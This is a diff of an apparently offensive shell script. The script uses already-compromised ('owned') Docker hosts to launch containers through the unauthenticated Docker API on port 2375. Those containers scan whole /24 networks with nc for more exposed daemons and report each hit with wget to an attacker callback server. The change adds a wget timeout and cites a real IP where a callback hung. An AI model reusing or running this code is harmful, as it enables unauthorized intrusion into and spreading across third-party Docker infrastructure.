@@ -105,7 +105,10 @@ for ip in $(cut -f1 "$WORK/dock.owned" 2>/dev/null | sort -u); do
 
     # the victim's script: expand each /24, nc it, report hits back to box1.
     # no double quotes anywhere, so the JSON needs no escaping on our side.
-    V="n=0; for p in $pre; do for i in \$(seq 0 255); do a=\$p.\$i; ( nc -w 1 \$a 2375 </dev/null && wget -qO- $BASE/hit?ip=\$a >/dev/null 2>&1 ) & n=\$((n+1)); if [ \$((n%$PAR)) -eq 0 ]; then wait; fi; done; done; wait; echo NEST-DONE"
+    # -T 5 on wget matters: busybox wget has NO default timeout, so one slow
+    # callback can hang the whole scanner (measured on 134.209.121.89, where a
+    # wget callback simply never returned and pinned a probe slot forever).
+    V="n=0; for p in $pre; do for i in \$(seq 0 255); do a=\$p.\$i; ( nc -w 1 \$a 2375 </dev/null && wget -qO- -T 5 $BASE/hit?ip=\$a >/dev/null 2>&1 ) & n=\$((n+1)); if [ \$((n%$PAR)) -eq 0 ]; then wait; fi; done; done; wait; echo NEST-DONE"
     BODY="{\"Image\":\"$IMG\",\"Tty\":true,\"Labels\":{\"kwscan\":\"1\"},\"Cmd\":[\"sh\",\"-c\",\"$V\"]}"
 
     curl -sS -m 10 -X DELETE "$b/containers/kwscan?force=1" >/dev/null 2>&1
